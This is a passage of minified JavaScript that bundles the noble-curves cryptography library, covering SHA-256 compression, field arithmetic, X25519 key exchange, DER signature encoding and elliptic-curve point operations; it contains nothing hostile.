nnt{constructor(){super(64,32,8,!1),this.A=gf[0]|0,this.B=gf[1]|0,this.C=gf[2]|0,this.D=gf[3]|0,this.E=gf[4]|0,this.F=gf[5]|0,this.G=gf[6]|0,this.H=gf[7]|0}get(){const{A:e,B:t,C:i,D:n,E:s,F:o,G:a,H:c}=this;return[e,t,i,n,s,o,a,c]}set(e,t,i,n,s,o,a,c){this.A=e|0,this.B=t|0,this.C=i|0,this.D=n|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,t){for(let d=0;d<16;d++,t+=4)mf[d]=e.getUint32(t,!1);for(let d=16;d<64;d++){const h=mf[d-15],f=mf[d-2],p=Yu(h,7)^Yu(h,18)^h>>>3,g=Yu(f,17)^Yu(f,19)^f>>>10;mf[d]=g+mf[d-7]+p+mf[d-16]|0}let{A:i,B:n,C:s,D:o,E:a,F:c,G:l,H:u}=this;for(let d=0;d<64;d++){const h=Yu(a,6)^Yu(a,11)^Yu(a,25),f=u+h+rnt(a,c,l)+snt[d]+mf[d]|0,p=(Yu(i,2)^Yu(i,13)^Yu(i,22))+int(i,n,s)|0;u=l,l=c,c=a,a=o+f|0,o=s,s=n,n=i,i=f+p|0}i=i+this.A|0,n=n+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,u=u+this.H|0,this.set(i,n,s,o,a,c,l,u)}roundClean(){mf.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const i6=Wse(()=>new ont);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const bE=BigInt(0),vE=BigInt(1),ant=BigInt(2);function $g(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function n6(r){if(!$g(r))throw new Error("Uint8Array expected")}function c3(r,e){if(typeof e!="boolean")throw new Error(r+" boolean expected, got "+e)}const cnt=Array.from({length:256},(r,e)=>e.toString(16).padStart(2,"0"));function l3(r){n6(r);let e="";for(let t=0;t<r.length;t++)e+=cnt[r[t]];return e}function Jm(r){const e=r.toString(16);return e.length&1?"0"+e:e}function gB(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);return r===""?bE:BigInt("0x"+r)}const Ih={_0:48,_9:57,A:65,F:70,a:97,f:102};function $K(r){if(r>=Ih._0&&r<=Ih._9)return r-Ih._0;if(r>=Ih.A&&r<=Ih.F)return r-(Ih.A-10);if(r>=Ih.a&&r<=Ih.f)return r-(Ih.a-10)}function u3(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);const e=r.length,t=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const i=new Uint8Array(t);for(let n=0,s=0;n<t;n++,s+=2){const o=$K(r.charCodeAt(s)),a=$K(r.charCodeAt(s+1));if(o===void 0||a===void 0){const c=r[s]+r[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}i[n]=o*16+a}return i}function q1(r){return gB(l3(r))}function By(r){return n6(r),gB(l3(Uint8Array.from(r).reverse()))}function d3(r,e){return u3(r.toString(16).padStart(e*2,"0"))}function yE(r,e){return d3(r,e).reverse()}function lnt(r){return u3(Jm(r))}function rc(r,e,t){let i;if(typeof e=="string")try{i=u3(e)}catch(s){throw new Error(r+" must be hex string or Uint8Array, cause: "+s)}else if($g(e))i=Uint8Array.from(e);else throw new Error(r+" must be hex string or Uint8Array");const n=i.length;if(typeof t=="number"&&n!==t)throw new Error(r+" of length "+t+" expected, got "+n);return i}function My(...r){let e=0;for(let i=0;i<r.length;i++){const n=r[i];n6(n),e+=n.length}const t=new Uint8Array(e);for(let i=0,n=0;i<r.length;i++){const s=r[i];t.set(s,n),n+=s.length}return t}function unt(r,e){if(r.length!==e.length)return!1;let t=0;for(let i=0;i<r.length;i++)t|=r[i]^e[i];return t===0}function dnt(r){if(typeof r!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(r))}const wT=r=>typeof r=="bigint"&&bE<=r;function xE(r,e,t){return wT(r)&&wT(e)&&wT(t)&&e<=r&&r<t}function n0(r,e,t,i){if(!xE(e,t,i))throw new Error("expected valid "+r+": "+t+" <= n < "+i+", got "+e)}function ioe(r){let e;for(e=0;r>bE;r>>=vE,e+=1);return e}function hnt(r,e){return r>>BigInt(e)&vE}function fnt(r,e,t){return r|(t?vE:bE)<<BigInt(e)}const mB=r=>(ant<<BigInt(r-1))-vE,bT=r=>new Uint8Array(r),RK=r=>Uint8Array.from(r);function noe(r,e,t){if(typeof r!="number"||r<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof t!="function")throw new Error("hmacFn must be a function");let i=bT(r),n=bT(r),s=0;const o=()=>{i.fill(1),n.fill(0),s=0},a=(...u)=>t(n,i,...u),c=(u=bT())=>{n=a(RK([0]),u),i=a(),u.length!==0&&(n=a(RK([1]),u),i=a())},l=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let u=0;const d=[];for(;u<e;){i=a();const h=i.slice();d.push(h),u+=i.length}return My(...d)};return(u,d)=>{o(),c(u);let h;for(;!(h=d(l()));)c();return o(),h}}const pnt={bigint:r=>typeof r=="bigint",function:r=>typeof r=="function",boolean:r=>typeof r=="boolean",string:r=>typeof r=="string",stringOrUint8Array:r=>typeof r=="string"||$g(r),isSafeInteger:r=>Number.isSafeInteger(r),array:r=>Array.isArray(r),field:(r,e)=>e.Fp.isValid(r),hash:r=>typeof r=="function"&&Number.isSafeInteger(r.outputLen)};function Z3(r,e,t={}){const i=(n,s,o)=>{const a=pnt[s];if(typeof a!="function")throw new Error("invalid validator function");const c=r[n];if(!(o&&c===void 0)&&!a(c,r))throw new Error("param "+String(n)+" is invalid. Expected "+s+", got "+c)};for(const[n,s]of Object.entries(e))i(n,s,!1);for(const[n,s]of Object.entries(t))i(n,s,!0);return r}const gnt=()=>{throw new Error("not implemented")};function NP(r){const e=new WeakMap;return(t,...i)=>{const n=e.get(t);if(n!==void 0)return n;const s=r(t,...i);return e.set(t,s),s}}var mnt=Object.freeze({__proto__:null,isBytes:$g,abytes:n6,abool:c3,bytesToHex:l3,numberToHexUnpadded:Jm,hexToNumber:gB,hexToBytes:u3,bytesToNumberBE:q1,bytesToNumberLE:By,numberToBytesBE:d3,numberToBytesLE:yE,numberToVarBytesBE:lnt,ensureBytes:rc,concatBytes:My,equalBytes:unt,utf8ToBytes:dnt,inRange:xE,aInRange:n0,bitLen:ioe,bitGet:hnt,bitSet:fnt,bitMask:mB,createHmacDrbg:noe,validateObject:Z3,notImplemented:gnt,memoized:NP});const Hs=BigInt(0),es=BigInt(1),p1=BigInt(2),wnt=BigInt(3),PP=BigInt(4),OK=BigInt(5),BK=BigInt(8);function Aa(r,e){const t=r%e;return t>=Hs?t:e+t}function soe(r,e,t){if(e<Hs)throw new Error("invalid exponent, negatives unsupported");if(t<=Hs)throw new Error("invalid modulus");if(t===es)return Hs;let i=es;for(;e>Hs;)e&es&&(i=i*r%t),r=r*r%t,e>>=es;return i}function Xl(r,e,t){let i=r;for(;e-- >Hs;)i*=i,i%=t;return i}function $P(r,e){if(r===Hs)throw new Error("invert: expected non-zero number");if(e<=Hs)throw new Error("invert: expected positive modulus, got "+e);let t=Aa(r,e),i=e,n=Hs,s=es;for(;t!==Hs;){const o=i/t,a=i%t,c=n-s*o;i=t,t=a,n=s,s=c}if(i!==es)throw new Error("invert: does not exist");return Aa(n,e)}function bnt(r){const e=(r-es)/p1;let t,i,n;for(t=r-es,i=0;t%p1===Hs;t/=p1,i++);for(n=p1;n<r&&soe(n,e,r)!==r-es;n++)if(n>1e3)throw new Error("Cannot find square root: likely non-prime P");if(i===1){const o=(r+es)/PP;return function(a,c){const l=a.pow(c,o);if(!a.eql(a.sqr(l),c))throw new Error("Cannot find square root");return l}}const s=(t+es)/p1;return function(o,a){if(o.pow(a,e)===o.neg(o.ONE))throw new Error("Cannot find square root");let c=i,l=o.pow(o.mul(o.ONE,n),t),u=o.pow(a,s),d=o.pow(a,t);for(;!o.eql(d,o.ONE);){if(o.eql(d,o.ZERO))return o.ZERO;let h=1;for(let p=o.sqr(d);h<c&&!o.eql(p,o.ONE);h++)p=o.sqr(p);const f=o.pow(l,es<<BigInt(c-h-1));l=o.sqr(f),u=o.mul(u,f),d=o.mul(d,l),c=h}return u}}function vnt(r){if(r%PP===wnt){const e=(r+es)/PP;return function(t,i){const n=t.pow(i,e);if(!t.eql(t.sqr(n),i))throw new Error("Cannot find square root");return n}}if(r%BK===OK){const e=(r-OK)/BK;return function(t,i){const n=t.mul(i,p1),s=t.pow(n,e),o=t.mul(i,s),a=t.mul(t.mul(o,p1),s),c=t.mul(o,t.sub(a,t.ONE));if(!t.eql(t.sqr(c),i))throw new Error("Cannot find square root");return c}}return bnt(r)}const ynt=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function xnt(r){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},t=ynt.reduce((i,n)=>(i[n]="function",i),e);return Z3(r,t)}function Cnt(r,e,t){if(t<Hs)throw new Error("invalid exponent, negatives unsupported");if(t===Hs)return r.ONE;if(t===es)return e;let i=r.ONE,n=e;for(;t>Hs;)t&es&&(i=r.mul(i,n)),n=r.sqr(n),t>>=es;return i}function Ent(r,e){const t=new Array(e.length),i=e.reduce((s,o,a)=>r.is0(o)?s:(t[a]=s,r.mul(s,o)),r.ONE),n=r.inv(i);return e.reduceRight((s,o,a)=>r.is0(o)?s:(t[a]=r.mul(s,t[a]),r.mul(s,o)),n),t}function ooe(r,e){const t=e!==void 0?e:r.toString(2).length,i=Math.ceil(t/8);return{nBitLength:t,nByteLength:i}}function aoe(r,e,t=!1,i={}){if(r<=Hs)throw new Error("invalid field: expected ORDER > 0, got "+r);const{nBitLength:n,nByteLength:s}=ooe(r,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:r,isLE:t,BITS:n,BYTES:s,MASK:mB(n),ZERO:Hs,ONE:es,create:c=>Aa(c,r),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return Hs<=c&&c<r},is0:c=>c===Hs,isOdd:c=>(c&es)===es,neg:c=>Aa(-c,r),eql:(c,l)=>c===l,sqr:c=>Aa(c*c,r),add:(c,l)=>Aa(c+l,r),sub:(c,l)=>Aa(c-l,r),mul:(c,l)=>Aa(c*l,r),pow:(c,l)=>Cnt(a,c,l),div:(c,l)=>Aa(c*$P(l,r),r),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>$P(c,r),sqrt:i.sqrt||(c=>(o||(o=vnt(r)),o(a,c))),invertBatch:c=>Ent(a,c),cmov:(c,l,u)=>u?l:c,toBytes:c=>t?yE(c,s):d3(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return t?By(c):q1(c)}});return Object.freeze(a)}function coe(r){if(typeof r!="bigint")throw new Error("field order must be bigint");const e=r.toString(2).length;return Math.ceil(e/8)}function loe(r){const e=coe(r);return e+Math.ceil(e/2)}function _nt(r,e,t=!1){const i=r.length,n=coe(e),s=loe(e);if(i<16||i<s||i>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+i);const o=t?By(r):q1(r),a=Aa(o,e-es)+es;return t?yE(a,n):d3(a,n)}const MK=BigInt(0),P8=BigInt(1);function vT(r,e){const t=e.negate();return r?t:e}function uoe(r,e){if(!Number.isSafeInteger(r)||r<=0||r>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+r)}function yT(r,e){uoe(r,e);const t=Math.ceil(e/r)+1,i=2**(r-1);return{windows:t,windowSize:i}}function Snt(r,e){if(!Array.isArray(r))throw new Error("array expected");r.forEach((t,i)=>{if(!(t instanceof e))throw new Error("invalid point at index "+i)})}function Ant(r,e){if(!Array.isArray(r))throw new Error("array of scalars expected");r.forEach((t,i)=>{if(!e.isValid(t))throw new Error("invalid scalar at index "+i)})}const xT=new WeakMap,doe=new WeakMap;function CT(r){return doe.get(r)||1}function Int(r,e){return{constTimeNegate:vT,hasPrecomputes(t){return CT(t)!==1},unsafeLadder(t,i,n=r.ZERO){let s=t;for(;i>MK;)i&P8&&(n=n.add(s)),s=s.double(),i>>=P8;return n},precomputeWindow(t,i){const{windows:n,windowSize:s}=yT(i,e),o=[];let a=t,c=a;for(let l=0;l<n;l++){c=a,o.push(c);for(let u=1;u<s;u++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(t,i,n){const{windows:s,windowSize:o}=yT(t,e);let a=r.ZERO,c=r.BASE;const l=BigInt(2**t-1),u=2**t,d=BigInt(t);for(let h=0;h<s;h++){const f=h*o;let p=Number(n&l);n>>=d,p>o&&(p-=u,n+=P8);const g=f,w=f+Math.abs(p)-1,m=h%2!==0,x=p<0;p===0?c=c.add(vT(m,i[g])):a=a.add(vT(x,i[w]))}return{p:a,f:c}},wNAFUnsafe(t,i,n,s=r.ZERO){const{windows:o,windowSize:a}=yT(t,e),c=BigInt(2**t-1),l=2**t,u=BigInt(t);for(let d=0;d<o;d++){const h=d*a;if(n===MK)break;let f=Number(n&c);if(n>>=u,f>a&&(f-=l,n+=P8),f===0)continue;let p=i[h+Math.abs(f)-1];f<0&&(p=p.negate()),s=s.add(p)}return s},getPrecomputes(t,i,n){let s=xT.get(i);return s||(s=this.precomputeWindow(i,t),t!==1&&xT.set(i,n(s))),s},wNAFCached(t,i,n){const s=CT(t);return this.wNAF(s,this.getPrecomputes(s,t,n),i)},wNAFCachedUnsafe(t,i,n,s){const o=CT(t);return o===1?this.unsafeLadder(t,i,s):this.wNAFUnsafe(o,this.getPrecomputes(o,t,n),i,s)},setWindowSize(t,i){uoe(i,e),doe.set(t,i),xT.delete(t)}}}function Tnt(r,e,t,i){if(Snt(t,r),Ant(i,e),t.length!==i.length)throw new Error("arrays of points and scalars must have equal length");const n=r.ZERO,s=ioe(BigInt(t.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,c=new Array(a+1).fill(n),l=Math.floor((e.BITS-1)/o)*o;let u=n;for(let d=l;d>=0;d-=o){c.fill(n);for(let f=0;f<i.length;f++){const p=i[f],g=Number(p>>BigInt(d)&BigInt(a));c[g]=c[g].add(t[f])}let h=n;for(let f=c.length-1,p=n;f>0;f--)p=p.add(c[f]),h=h.add(p);if(u=u.add(h),d!==0)for(let f=0;f<o;f++)u=u.double()}return u}function hoe(r){return xnt(r.Fp),Z3(r,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...ooe(r.n,r.nBitLength),...r,p:r.Fp.ORDER})}BigInt(0),BigInt(1),BigInt(2),BigInt(8);const dm=BigInt(0),ET=BigInt(1);function knt(r){return Z3(r,{a:"bigint"},{montgomeryBits:"isSafeInteger",nByteLength:"isSafeInteger",adjustScalarBytes:"function",domain:"function",powPminus2:"function",Gu:"bigint"}),Object.freeze({...r})}function Nnt(r){const e=knt(r),{P:t}=e,i=x=>Aa(x,t),n=e.montgomeryBits,s=Math.ceil(n/8),o=e.nByteLength,a=e.adjustScalarBytes||(x=>x),c=e.powPminus2||(x=>soe(x,t-BigInt(2),t));function l(x,S,T){const k=i(x*(S-T));return S=i(S-k),T=i(T+k),[S,T]}const u=(e.a-BigInt(2))/BigInt(4);function d(x,S){n0("u",x,dm,t),n0("scalar",S,dm,t);const T=S,k=x;let I=ET,E=dm,C=x,N=ET,L=dm,$;for(let A=BigInt(n-1);A>=dm;A--){const b=T>>A&ET;L^=b,$=l(L,I,C),I=$[0],C=$[1],$=l(L,E,N),E=$[0],N=$[1],L=b;const v=I+E,_=i(v*v),O=I-E,D=i(O*O),R=_-D,P=C+N,B=C-N,M=i(B*v),W=i(P*O),K=M+W,q=M-W;C=i(K*K),N=i(k*i(q*q)),I=i(_*D),E=i(R*(_+i(u*R)))}$=l(L,I,C),I=$[0],C=$[1],$=l(L,E,N),E=$[0],N=$[1];const y=c(E);return i(I*y)}function h(x){return yE(i(x),s)}function f(x){const S=rc("u coordinate",x,s);return o===32&&(S[31]&=127),By(S)}function p(x){const S=rc("scalar",x),T=S.length;if(T!==s&&T!==o){let k=""+s+" or "+o;throw new Error("invalid scalar, expected "+k+" bytes, got "+T)}return By(a(S))}function g(x,S){const T=f(S),k=p(x),I=d(T,k);if(I===dm)throw new Error("invalid private or public key received");return h(I)}const w=h(e.Gu);function m(x){return g(x,w)}return{scalarMult:g,scalarMultBase:m,getSharedSecret:(x,S)=>g(x,S),getPublicKey:x=>m(x),utils:{randomPrivateKey:()=>e.randomBytes(e.nByteLength)},GuBytes:w}}const RP=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949");BigInt(0);const Pnt=BigInt(1),DK=BigInt(2),$nt=BigInt(3),Rnt=BigInt(5);BigInt(8);function Ont(r){const e=BigInt(10),t=BigInt(20),i=BigInt(40),n=BigInt(80),s=RP,o=r*r%s*r%s,a=Xl(o,DK,s)*o%s,c=Xl(a,Pnt,s)*r%s,l=Xl(c,Rnt,s)*c%s,u=Xl(l,e,s)*l%s,d=Xl(u,t,s)*u%s,h=Xl(d,i,s)*d%s,f=Xl(h,n,s)*h%s,p=Xl(f,n,s)*h%s,g=Xl(p,e,s)*l%s;return{pow_p_5_8:Xl(g,DK,s)*r%s,b2:o}}function Bnt(r){return r[0]&=248,r[31]&=127,r[31]|=64,r}const OP=Nnt({P:RP,a:BigInt(486662),montgomeryBits:255,nByteLength:32,Gu:BigInt(9),powPminus2:r=>{const e=RP,{pow_p_5_8:t,b2:i}=Ont(r);return Aa(Xl(t,$nt,e)*i,e)},adjustScalarBytes:Bnt,randomBytes:G3});function LK(r){r.lowS!==void 0&&c3("lowS",r.lowS),r.prehash!==void 0&&c3("prehash",r.prehash)}function Mnt(r){const e=hoe(r);Z3(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:t,Fp:i,a:n}=e;if(t){if(!i.eql(n,i.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if(typeof t!="object"||typeof t.beta!="bigint"||typeof t.splitScalar!="function")throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:Dnt,hexToBytes:Lnt}=mnt;class Unt extends Error{constructor(e=""){super(e)}}const Wh={Err:Unt,_tlv:{encode:(r,e)=>{const{Err:t}=Wh;if(r<0||r>256)throw new t("tlv.encode: wrong tag");if(e.length&1)throw new t("tlv.encode: unpadded data");const i=e.length/2,n=Jm(i);if(n.length/2&128)throw new t("tlv.encode: long form length too big");const s=i>127?Jm(n.length/2|128):"";return Jm(r)+s+n+e},decode(r,e){const{Err:t}=Wh;let i=0;if(r<0||r>256)throw new t("tlv.encode: wrong tag");if(e.length<2||e[i++]!==r)throw new t("tlv.decode: wrong tlv");const n=e[i++],s=!!(n&128);let o=0;if(!s)o=n;else{const c=n&127;if(!c)throw new t("tlv.decode(long): indefinite length not supported");if(c>4)throw new t("tlv.decode(long): byte length is too big");const l=e.subarray(i,i+c);if(l.length!==c)throw new t("tlv.decode: length bytes not complete");if(l[0]===0)throw new t("tlv.decode(long): zero leftmost byte");for(const u of l)o=o<<8|u;if(i+=c,o<128)throw new t("tlv.decode(long): not minimal encoding")}const a=e.subarray(i,i+o);if(a.length!==o)throw new t("tlv.decode: wrong value length");return{v:a,l:e.subarray(i+o)}}},_int:{encode(r){const{Err:e}=Wh;if(r<Gh)throw new e("integer: negative integers are not allowed");let t=Jm(r);if(Number.parseInt(t[0],16)&8&&(t="00"+t),t.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return t},decode(r){const{Err:e}=Wh;if(r[0]&128)throw new e("invalid signature integer: negative");if(r[0]===0&&!(r[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return Dnt(r)}},toSig(r){const{Err:e,_int:t,_tlv:i}=Wh,n=typeof r=="string"?Lnt(r):r;n6(n);const{v:s,l:o}=i.decode(48,n);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=i.decode(2,s),{v:l,l:u}=i.decode(2,c);if(u.length)throw new e("invalid signature: left bytes after parsing");return{r:t.decode(a),s:t.decode(l)}},hexFromSig(r){const{_tlv:e,_int:t}=Wh,i=e.encode(2,t.encode(r.r)),n=e.encode(2,t.encode(r.s)),s=i+n;return e.encode(48,s)}},Gh=BigInt(0),Ls=BigInt(1);BigInt(2);const UK=BigInt(3);BigInt(4);function jnt(r){const e=Mnt(r),{Fp:t}=e,i=aoe(e.n,e.nBitLength),n=e.toBytes||((g,w,m)=>{const x=w.toAffine();return My(Uint8Array.from([4]),t.toBytes(x.x),t.toBytes(x.y))}),s=e.fromBytes||(g=>{const w=g.subarray(1),m=t.fromBytes(w.subarray(0,t.BYTES)),x=t.fromBytes(w.subarray(t.BYTES,2*t.BYTES));return{x:m,y:x}});function o(g){const{a:w,b:m}=e,x=t.sqr(g),S=t.mul(x,g);return t.add(t.add(S,t.mul(g,w)),m)}if(!t.eql(t.sqr(e.Gy),o(e.Gx)))throw new Error("bad generator point: equation left != right");function a(g){return xE(g,Ls,e.n)}function c(g){const{allowedPrivateKeyLengths:w,nByteLength:m,wrapPrivateKey:x,n:S}=e;if(w&&typeof g!="bigint"){if($g(g)&&(g=l3(g)),typeof g!="string"||!w.includes(g.length))throw new Error("invalid private key");g=g.padStart(m*2,"0")}let T;try{T=typeof g=="bigint"?g:q1(rc("private key",g,m))}catch{throw new Error("invalid private key, expected hex or "+m+" bytes, got "+typeof g)}return x&&(T=Aa(T,S)),n0("private key",T,Ls,S),T}function l(g){if(!(g instanceof h))throw new Error("ProjectivePoint expected")}const u=NP((g,w)=>{const{px:m,py:x,pz:S}=g;if(t.eql(S,t.ONE))return{x:m,y:x};const T=g.is0();w==null&&(w=T?t.ONE:t.inv(S));const k=t.mul(m,w),I=t.mul(x,w),E=t.mul(S,w);if(T)return{x:t.ZERO,y:t.ZERO};if(!t.eql(E,t.ONE))throw new Error("invZ was invalid");return{x:k,y:I}}),d=NP(g=>{if(g.is0()){if(e.allowInfinityPoint&&!t.is0(g.py))return;throw new Error("bad point: ZERO")}const{x:w,y:m}=g.toAffine();if(!t.isValid(w)||!t.isValid(m))throw new Error("bad point: x or y not FE");const x=t.sqr(m),S=o(w);if(!t.eql(x,S))throw new Error("bad point: equation left != right");if(!g.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class h{constructor(w,m,x){if(this.px=w,this.py=m,this.pz=x,w==null||!t.isValid(w))throw new Error("x required");if(m==null||!t.isValid(m))throw new Error("y required");if(x==null||!t.isValid(x))throw new Error("z required");Object.freeze(this)}static fromAffine(w){const{x:m,y:x}=w||{};if(!w||!t.isValid(m)||!t.isValid(x))throw new Error("invalid affine point");if(w instanceof h)throw new Error("projective point not allowed");const S=T=>t.eql(T,t.ZERO);return S(m)&&S(x)?h.ZERO:new h(m,x,t.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(w){const m=t.invertBatch(w.map(x=>x.pz));return w.map((x,S)=>x.toAffine(m[S])).map(h.fromAffine)}static fromHex(w){const m=h.fromAffine(s(rc("pointHex",w)));return m.assertValidity(),m}static fromPrivateKey(w){return h.BASE.multiply(c(w))}static msm(w,m){return Tnt(h,i,w,m)}_setWindowSize(w){p.setWindowSize(this,w)}assertValidity(){d(this)}hasEvenY(){const{y:w}=this.toAffine();if(t.isOdd)return!t.isOdd(w);throw new Error("Field doesn't support isOdd")}equals(w){l(w);const{px:m,py:x,pz:S}=this,{px:T,py:k,pz:I}=w,E=t.eql(t.mul(m,I),t.mul(T,S)),C=t.eql(t.mul(x,I),t.mul(k,S));return E&&C}negate(){return new h(this.px,t.neg(this.py),this.pz)}double(){const{a:w,b:m}=e,x=t.mul(m,UK),{px:S,py:T,pz:k}=this;let I=t.ZERO,E=t.ZERO,C=t.ZERO,N=t.mul(S,S),L=t.mul(T,T),$=t.mul(k,k),y=t.mul(S,T);return y=t.add(y,y),C=t.mul(S,k),C=t.add(C,C),I=t.mul(w,C),E=t.mul(x,$),E=t.add(I,E),I=t.sub(L,E),E=t.add(L,E),E=t.mul(I,E),I=t.mul(y,I),C=t.mul(x,C),$=t.mul(w,$),y=t.sub(N,$),y=t.mul(w,y),y=t.add(y,C),C=t.add(N,N),N=t.add(C,N),N=t.add(N,$),N=t.mul(N,y),E=t.add(E,N),$=t.mul(T,k),$=t.add($,$),N=t.mul($,y),I=t.sub(I,N),C=t.mul($,L),C=t.add(C,C),C=t.add(C,C),new h(I,E,C)}add(w){l(w);const{px:m,py:x,pz:S}=this,{px:T,py:k,pz:I}=w;let E=t.ZERO,C=t.ZERO,N=t.ZERO;const L=e.a,$=t.mul(e.b,UK);let y=t.mul(m,T),A=t.mul(x,k),b=t.mul(S,I),v=t.add(m,x),_=t.add(T,k);v=t.mul(v,_),_=t.add(y,A),v=t.sub(v,_),_=t.add(m,S);let O=t.add(T,I);return _=t.mul(_,O),O=t.add(y,b),_=t.sub(_,O),O=t.add(x,S),E=t.add(k,I),O=t.mul(O,E),E=t.add(A,b),O=t.sub(O,E),N=t.mul(L,_),E=t.mul($,b),N=t.add(E,N),E=t.sub(A,N),N=t.add(A,N),C=t.mul(E,N),A=t.add(y,y),A=t.add(A,y),b=t.mul(L,b),_=t.mul($,_),A=t.add(A,b),b=t.sub(y,b),b=t.mul(L,b),_=t.add(_,b),y=t.mul(A,_),C=t.add(C,y),y=t.mul(O,_),E=t.mul(v,E),E=t.sub(E,y),y=t.mul(v,A),N=t.mul(O,N),N=t.add(N,y),new h(E,C,N)}subtract(w){return this.add(w.negate())}is0(){return this.equals(h.ZERO)}wNAF(w){return p.wNAFCached(this,w,h.normalizeZ)}multiplyUnsafe(w){const{endo:m,n:x}=e;n0("scalar",w,Gh,x);const S=h.ZERO;if(w===Gh)return S;if(this.is0()||w===Ls)return this;if(!m||p.hasPrecomputes(this))return p.wNAFCachedUnsafe(this,w,h.normalizeZ);let{k1neg:T,k1:k,k2neg:I,k2:E}=m.splitScalar(w),C=S,N=S,L=this;for(;k>Gh||E>Gh;)k&Ls&&(C=C.add(L)),E&Ls&&(N=N.add(L)),L=L.double(),k>>=Ls,E>>=Ls;return T&&(C=C.negate()),I&&(N=N.negate()),N=new h(t.mul(N.px,m.beta),N.py,N.pz),C.add(N)}multiply(w){const{endo:m,n:x}=e;n0("scalar",w,Ls,x);let S,T;if(m){const{k1neg:k,k1:I,k2neg:E,k2:C}=m.splitScalar(w);let{p:N,f:L}=this.wNAF(I),{p:$,f:y}=this.wNAF(C);N=p.constTimeNegate(k,N),$=p.constTimeNegate(E,$),$=new h(t.mul($.px,m.beta),$.py,$.pz),S=N.add($),T=L.add(y)}else{const{p:k,f:I}=this.wNAF(w);S=k,T=I}return h.normalizeZ([S,T])[0]}multiplyAndAddUnsafe(w,m,x){const S=h.BASE,T=(I,E)=>E===Gh||E===Ls||!I.equals(S)?I.multiplyUnsafe(E):I.multiply(E),k=T(this,m).add(T(w,x));return k.is0()?void 0:k}toAffine(w){return u(this,w)}isTorsionFree(){const{h:w,isTorsionFree:m}=e;if(w===Ls)return!0;if(m)return m(h,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:w,clearCofactor:m}=e;return w===Ls?this:m?m(h,this):this.multiplyUnsafe(e.h)}toRawBytes(w=!0){return c3("isCompressed",w),this.assertValidity(),n(h,this,w)}toHex(w=!0){return c3("isCompressed",w),l3(this.toRawBytes(w))}}h.BASE=new h(e.Gx,e.Gy,t.ONE),h.ZERO=new h(t.ZERO,t.ONE,t.ZERO);const f=e.nBitLength,p=Int(h,e.endo?Math.ceil(f/2):f);return{CURVE:e,ProjectivePoint:h,normPrivateKeyToScalar:c,weierstrassEquation:o,isWithinCurveOrder:a}}function Fnt(r){const e=hoe(r);return Z3(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function qnt(r){const e=Fnt(r),{Fp:t,n:i}=e,n=t.BYTES+1,s=2*t.BYTES+1;function o(b){return Aa(b,i)}function a(b){return $P(b,i)}const{ProjectivePoint:c,normPrivateKeyToScalar:l,weierstrassEquation:u,isWithinCurveOrder:d}=jnt({...e,toBytes(b,v,_){const O=v.toAffine(),D=t.toBytes(O.x),R=My;return c3("isCompressed",_),_?R(Uint8Array.from([v.hasEvenY()?2:3]),D):R(Uint8Array.from([4]),D,t.toBytes(O.y))},fromBytes(b){const v=b.length,_=b[0],O=b.subarray(1);if(v===n&&(_===2||_===3)){const D=q1(O);if(!xE(D,Ls,t.ORDER))throw new Error("Point is not on curve");const R=u(D);let P;try{P=t.sqrt(R)}catch(M){const W=M instanceof Error?": "+M.message:"";throw new Error("Point is not on curve"+W)}const B=(P&Ls)===Ls;return(_&1)===1!==B&&(P=t.neg(P)),{x:D,y:P}}else if(v===s&&_===4){const D=t.fromBytes(O.subarray(0,t.BYTES)),R=t.fromBytes(O.subarray(t.BYTES,2*t.BYTES));return{x:D,y:R}}else{const D=n,R=s;throw new Error("invalid Point, expected length of "+D+", or uncompressed "+R+", got "+v)}}}),h=b=>l3(d3(b,e.nByteLength));function f(b){const v=i>>Ls;return b>v}function p(b){return f(b)?o(-b):b}const g=(b,v,_)=>q1(b.slice(v,_));class 